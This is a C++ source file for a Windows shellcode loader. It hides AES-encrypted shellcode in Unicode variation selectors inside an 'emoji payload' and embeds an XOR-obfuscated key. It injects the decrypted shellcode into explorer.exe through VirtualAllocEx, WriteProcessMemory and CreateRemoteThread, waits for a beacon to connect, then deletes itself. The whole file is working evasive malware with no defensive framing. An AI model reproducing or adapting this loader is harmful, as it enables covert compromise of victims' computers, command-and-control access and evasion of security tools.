#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <vector>
#include <cstring>

//===============================================================================================
// String Obfuscation - Compile-time XOR encryption
//===============================================================================================
template<size_t N>
class ObfuscatedString {
private:
    wchar_t data[N];
    
public:
    constexpr ObfuscatedString(const wchar_t(&str)[N], unsigned char key) : data{} {
        for (size_t i = 0; i < N; i++) {
            data[i] = str[i] ^ key;
        }
    }
    
    void decrypt(unsigned char key) {
        for (size_t i = 0; i < N; i++) {
            data[i] ^= key;
        }
    }
    
    wchar_t* get() { return data; }
};

// Macro for easy string obfuscation
#define OBFUSCATE(str) []() { \
    constexpr unsigned char key = 0xAB; \
    static ObfuscatedString<sizeof(str)/sizeof(wchar_t)> obf(str, key); \
    obf.decrypt(key); \
    return obf.get(); \
}()

// For char strings
template<size_t N>
class ObfuscatedStringA {
private:
    char data[N];
    
public:
    constexpr ObfuscatedStringA(const char(&str)[N], unsigned char key) : data{} {
        for (size_t i = 0; i < N; i++) {
            data[i] = str[i] ^ key;
        }
    }
    
    void decrypt(unsigned char key) {
        for (size_t i = 0; i < N; i++) {
            data[i] ^= key;
        }
    }
    
    char* get() { return data; }
};

#define OBFUSCATE_A(str) []() { \
    constexpr unsigned char key = 0xAB; \
    static ObfuscatedStringA<sizeof(str)> obf(str, key); \
    obf.decrypt(key); \
    return obf.get(); \
}()

//===============================================================================================
// Self-Deletion Logic
//===============================================================================================
typedef LONG NTSTATUS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* NtSetInformationFile_t)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

#ifndef FILE_DISPOSITION_INFORMATION_EX
#define FILE_DISPOSITION_INFORMATION_EX struct _FILE_DISPOSITION_INFORMATION_EX
#define FileDispositionInformationEx ((INT)64)
#define FILE_DISPOSITION_DELETE 0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
};
#endif

bool SelfDelete() {
    wchar_t szPath[MAX_PATH * 2] = { 0 };
    FILE_RENAME_INFO* pRename = nullptr;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        return false;
    }

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    wchar_t* NewStream = OBFUSCATE(L":gone");
    size_t sRename = sizeof(FILE_RENAME_INFO) + (wcslen(NewStream) * sizeof(wchar_t));
    pRename = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        CloseHandle(hFile);
        return false;
    }

    pRename->ReplaceIfExists = FALSE;
    pRename->RootDirectory = NULL;
    pRename->FileNameLength = wcslen(NewStream) * sizeof(wchar_t);
    memcpy(pRename->FileName, NewStream, pRename->FileNameLength);

    SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename);
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pRename);

    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HMODULE hNtdll = GetModuleHandleW(OBFUSCATE(L"ntdll.dll"));
    NtSetInformationFile_t pNtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(hNtdll, OBFUSCATE_A("NtSetInformationFile"));
    if (pNtSetInformationFile == NULL) {
        CloseHandle(hFile);
        return false;
    }
    
    FILE_DISPOSITION_INFORMATION_EX dispo = { 0 };
    dispo.Flags = FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS;

    IO_STATUS_BLOCK iosb = { 0 };
    pNtSetInformationFile(hFile, &iosb, &dispo, sizeof(dispo), FileDispositionInformationEx);
    
    CloseHandle(hFile);
    return true;
}

//===============================================================================================
// Simple Key Storage - Key embedded at compile time
//===============================================================================================
class KeyDerivation {
public:
    static std::vector<BYTE> DeriveKey() {
        // XOR-encoded key components (replaced by build_emoji_payload.py).
        // Chunk i is XOR-encoded with xkey(i) = 0xA5 + i*0x11 (mirrors obfuscate_key_for_cpp).
        const BYTE k1[] = {0x4A, 0x8F, 0x23, 0xC7, 0x91, 0x5E, 0xD2, 0x6B};
        const BYTE k2[] = {0x7C, 0x3A, 0xE9, 0x15, 0x8D, 0x47, 0xB6, 0x2F};
        const BYTE k3[] = {0xA1, 0x5C, 0xF8, 0x34, 0xD9, 0x72, 0xBE, 0x60};
        const BYTE k4[] = {0x93, 0x2D, 0xC5, 0x78, 0xE4, 0x19, 0xAF, 0x51};
        
        const BYTE* chunks[4] = {k1, k2, k3, k4};
        std::vector<BYTE> derivedKey(32);
        for (int i = 0; i < 4; i++) {
            BYTE xkey = (BYTE)(0xA5 + i * 0x11);
            for (int j = 0; j < 8; j++) {
                derivedKey[i * 8 + j] = chunks[i][j] ^ xkey;
            }
        }
        
        return derivedKey;
    }
};

//===============================================================================================
// Emoji Decoder - Extract data from Unicode variation selectors
//===============================================================================================
class EmojiDecoder {
public:
    static std::vector<BYTE> DecodeFromEmoji(const wchar_t* emojiData, size_t emojiLen) {
        std::vector<BYTE> decoded;
        BYTE currentByte = 0;
        int nibbleCount = 0;
        
        for (size_t i = 0; i < emojiLen; i++) {
            wchar_t ch = emojiData[i];
            
            // Check if it's a variation selector (U+FE00 to U+FE0F)
            if (ch >= 0xFE00 && ch <= 0xFE0F) {
                BYTE nibble = ch - 0xFE00;
                
                if (nibbleCount % 2 == 0) {
                    currentByte = nibble << 4; // High nibble
                } else {
                    currentByte |= nibble; // Low nibble
                    decoded.push_back(currentByte);
                    currentByte = 0;
                }
                nibbleCount++;
            }
        }
        
        return decoded;
    }
};

//===============================================================================================
// AES-256 Decryptor using Windows Crypto API
//===============================================================================================

// PLAINTEXTKEYBLOB structure for importing raw key bytes.
// CryptDeriveKey applies internal FIPS-186 key derivation which may produce
// different key material than using the SHA-256 hash output directly.
// CryptImportKey with PLAINTEXTKEYBLOB sets the exact raw bytes as the key,
// matching the Python side where AES.new(hash_bytes, ...) uses them directly.
#ifndef _PROJECT_NULL_PLAINTEXTKEYBLOB_HEADER_DEFINED
#define _PROJECT_NULL_PLAINTEXTKEYBLOB_HEADER_DEFINED
typedef struct _PLAINTEXTKEYBLOB_HEADER {
    BLOBHEADER hdr;
    DWORD dwKeySize;
} PLAINTEXTKEYBLOB_HEADER;
#define PLAINTEXTKEYBLOBHEADER_SIZE sizeof(PLAINTEXTKEYBLOB_HEADER)
#endif

class AESDecryptor {
public:
    static std::vector<BYTE> Decrypt(const std::vector<BYTE>& encrypted, const std::vector<BYTE>& key) {
        std::vector<BYTE> decrypted;
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;
        
        // First 16 bytes are IV, rest is encrypted data
        if (encrypted.size() < 16) {
            return decrypted;
        }
        
        std::vector<BYTE> iv(encrypted.begin(), encrypted.begin() + 16);
        std::vector<BYTE> ciphertext(encrypted.begin() + 16, encrypted.end());
        
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            return decrypted;
        }
        
        // --- Key derivation: SHA-256 hash of the raw key ---
        // This must match the Python side exactly:
        //   key_hash = hashlib.sha256(key).digest()
        //   cipher = AES.new(key_hash, AES.MODE_CBC, iv)
        // Python uses the 32-byte SHA-256 output DIRECTLY as the AES-256 key.
        // We replicate this by hashing here and importing the result as a
        // PLAINTEXTKEYBLOB, bypassing CryptDeriveKey's internal FIPS-186
        // derivation which may alter the key bytes.
        
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        if (!CryptHashData(hHash, key.data(), key.size(), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        // Extract the raw SHA-256 hash bytes (32 bytes for AES-256)
        DWORD hashLen = 0;
        DWORD hashLenSize = sizeof(hashLen);
        if (!CryptGetHashParam(hHash, HP_HASHVAL, NULL, &hashLen, 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        std::vector<BYTE> hashBytes(hashLen);
        if (!CryptGetHashParam(hHash, HP_HASHVAL, hashBytes.data(), &hashLen, 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        // Build a PLAINTEXTKEYBLOB to import the raw hash bytes as the AES key.
        // Structure: [BLOBHEADER][dwKeySize][raw key bytes]
        // This ensures the AES key is exactly the SHA-256 hash output,
        // matching what pycryptodome's AES.new(hash_bytes) does.
        DWORD blobSize = PLAINTEXTKEYBLOBHEADER_SIZE + hashLen;
        std::vector<BYTE> keyBlob(blobSize);
        
        PLAINTEXTKEYBLOB_HEADER* header = (PLAINTEXTKEYBLOB_HEADER*)keyBlob.data();
        header->hdr.bType = PLAINTEXTKEYBLOB;       // 0x08
        header->hdr.bVersion = CUR_BLOB_VERSION;     // 0x02
        header->hdr.reserved = 0;
        header->hdr.aiKeyAlg = CALG_AES_256;           // 0x00006610
        header->dwKeySize = hashLen;                 // 32 bytes
        memcpy(keyBlob.data() + PLAINTEXTKEYBLOBHEADER_SIZE, hashBytes.data(), hashLen);
        
        if (!CryptImportKey(hProv, keyBlob.data(), blobSize, 0, 0, &hKey)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        // Hash object no longer needed after import
        CryptDestroyHash(hHash);
        hHash = 0;
        
        // Set the IV (must be set AFTER key import)
        if (!CryptSetKeyParam(hKey, KP_IV, iv.data(), 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return decrypted;
        }
        
        decrypted = ciphertext;
        DWORD dataLen = decrypted.size();
        
        if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &dataLen)) {
            decrypted.clear();
        } else {
            decrypted.resize(dataLen);
        }
        
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        
        return decrypted;
    }
};

//===============================================================================================
// Main - Simple Direct Execution
//===============================================================================================
int main() {
    // STEP 1: Emoji payload (will be replaced by Python script)
    const wchar_t emojiPayload[] = L"EMOJI_PAYLOAD_PLACEHOLDER";
    
    // STEP 2: Decode emoji to get encrypted shellcode
    std::vector<BYTE> encryptedShellcode = EmojiDecoder::DecodeFromEmoji(
        emojiPayload, 
        wcslen(emojiPayload)
    );
    
    if (encryptedShellcode.empty()) {
        return 10; // Failed to decode
    }
    
    // STEP 3: Get decryption key
    std::vector<BYTE> key = KeyDerivation::DeriveKey();
    
    // STEP 4: Decrypt shellcode
    std::vector<BYTE> shellcode = AESDecryptor::Decrypt(encryptedShellcode, key);
    
    if (shellcode.empty()) {
        return 20; // Failed to decrypt
    }
    
    // Minimum viable x64 shellcode (sub rsp + stub + payload)
    if (shellcode.size() < 32) {
        return 30;
    }
    
    // STEP 5: Find target process (explorer.exe)
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 40;
    
    wchar_t* explorerName = OBFUSCATE(L"explorer.exe");
    DWORD targetPID = 0;
    if (Process32FirstW(processesSnapshot, &processInfo)) {
        if (wcscmp(explorerName, processInfo.szExeFile) == 0) {
            targetPID = processInfo.th32ProcessID;
        }
    }
    
    while (targetPID == 0 && Process32NextW(processesSnapshot, &processInfo)) {
        if (wcscmp(explorerName, processInfo.szExeFile) == 0) {
            targetPID = processInfo.th32ProcessID;
        }
    }
    
    CloseHandle(processesSnapshot);
    if (targetPID == 0) return 50; // No explorer.exe found
    
    // STEP 6: Inject into explorer.exe
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) return 60;
    
    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        CloseHandle(hProcess);
        return 70;
    }
    
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode.data(), shellcode.size(), NULL)) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 75;
    }
    
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hRemoteThread == NULL) {
        CloseHandle(hProcess);
        return 80;
    }
    
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    
    // STEP 7: Self-delete after successful injection
    Sleep(2000); // Wait 2 seconds for beacon to connect
    SelfDelete();
    
    return 0;
}
